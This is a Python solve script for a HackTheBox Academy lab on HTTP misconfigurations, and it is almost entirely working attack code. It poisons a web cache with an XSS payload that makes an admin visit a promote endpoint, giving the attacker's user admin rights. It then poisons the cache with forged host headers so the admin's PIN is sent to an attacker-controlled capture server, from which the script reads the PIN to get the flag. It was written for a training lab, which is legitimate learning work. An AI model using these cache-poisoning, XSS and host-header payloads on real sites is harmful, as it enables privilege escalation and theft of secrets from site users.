#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox Academy lab called 'Hard Skills Assessment' for the module called 'Abusing HTTP Misconfigurations'
This script first exploits a web cache poisoning attack that caches a xss that promotes our user to an admin role.  Next, it exploits a  web cache poisoning attack that caches a host header attack on an admin role function on the site
"""

import requests
import time

session= requests.Session()
target= "httpattacks.htb:30180" # update this
my_capturing_data_server= "interactsh.local:30180" # update this
proxies= {"http":"http://127.0.0.1:8080"}
headers= {"Content-type":"application/x-www-form-urlencoded"}
    
# Login as a regular user
def login():
    data="username=htb-stdnt&password=Academy_student!"
    session.post(f"http://{target}/admin/login", proxies=proxies, data=data, headers=headers)

# Cache the endpoint with an xss that will promote our user to an admin role
def web_cache_xss_attack():
    path= '/admin/users.html?sort_by=role&utm_source=1;sort_by=role")</script><script>location="/admin/promote?uid=2"</script><script>'
    response= session.get(url=f"http://{target}{path}", proxies=proxies, headers=headers, allow_redirects=True)
    
    # Wait for the admin victim to visit the cached xss which will cause the victim to promote our user to admin
    time.sleep(60)  
    
#  Cache the endpoint with a host header attack that will cause the admin victim to post the pin number to our server
def web_cache_host_header_attack():
    headers2={
        "X-Forwarded-Host": f"{my_capturing_data_server}",
        "X-HTTP-Host-Override": f"{my_capturing_data_server}",
        "Forwarded": f"{my_capturing_data_server}", 
        "X-Host": f"{my_capturing_data_server}",
        "X-Forwarded-Server": f"{my_capturing_data_server}",
        "Server": f"{my_capturing_data_server}",
        "X-Powered-By": f"{my_capturing_data_server}"
        }
    
    response= session.get(f"http://{target}/admin/sysinfo?refresh=1", proxies=proxies, headers=headers2, allow_redirects=True)
    
    # Wait for the victim to visit the cached xss which will cause the user to post the pin number to my_capturing_data_server
    time.sleep(60)

# Get the pin number from my_capturing_data_server, submit that pin, and then get the flag
def get_flag():
    response= requests.get(url=f"http://{my_capturing_data_server}/log", proxies=proxies)
    for line in response.text.splitlines():
        if "pin=" in line:
            print(line)
            data=line
            break
        else:
            pass
    response= session.post(url=f"http://{target}/admin/sysinfo_pin", proxies=proxies, headers=headers, data=data, allow_redirects=True)
    response= session.get(url=f"http://{target}/admin/sysinfo", proxies=proxies, allow_redirects=True)
    for line in response.text.splitlines():
        if "HTB{" in line:
            print(line)
            break
        else:
            pass
try:
    login()
    web_cache_xss_attack()
    web_cache_host_header_attack()
    get_flag()
except KeyboardInterrupt:
    print("ctrl +c detected, exiting gracefully")
